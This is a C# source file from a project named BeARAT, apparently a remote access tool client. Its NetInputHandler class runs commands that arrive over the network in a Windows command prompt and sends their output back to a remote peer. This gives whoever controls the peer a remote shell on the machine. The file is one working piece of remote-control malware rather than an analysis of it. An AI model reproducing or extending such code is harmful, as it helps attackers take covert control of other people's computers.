using BeARAT.Client.Execs;
using BeARAT.Common.IO;
using BeARAT.Common.Concurrency;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BeARAT.Client.IO
{
    class NetInputHandler : IInputHandler
    {
        private const string SET_SHELL = "Used shell: {0}";
        private const int SLEEP_INTERVAL = 50;

        Shell sh;

        public NetInputHandler()
        {
            SetShell(new CommandPrompt());
        }

        public void Handle(string input)
        {
            Common.IO.Console.Debug("Standard In: " + input);
            RunShellCommand(input);
            string output = sh.StdOut();
            Model.Peer.Send(output);
            Common.IO.Console.Debug("Standard Out: " + output);
        }

        public void RunShellCommand(string input)
        {
            sh.StdIn(input);
            sh.Start();

            while (sh.IsRunning())
            {
                System.Threading.Thread.Sleep(SLEEP_INTERVAL);
            }
        }

        public void SetShell(Shell sh)
        {
            this.sh = sh;
            Common.Concurrency.Task t = (Common.Concurrency.Task) this.sh;
            Common.IO.Console.Debug(String.Format(SET_SHELL, t.ToString()));
        }
    }
}
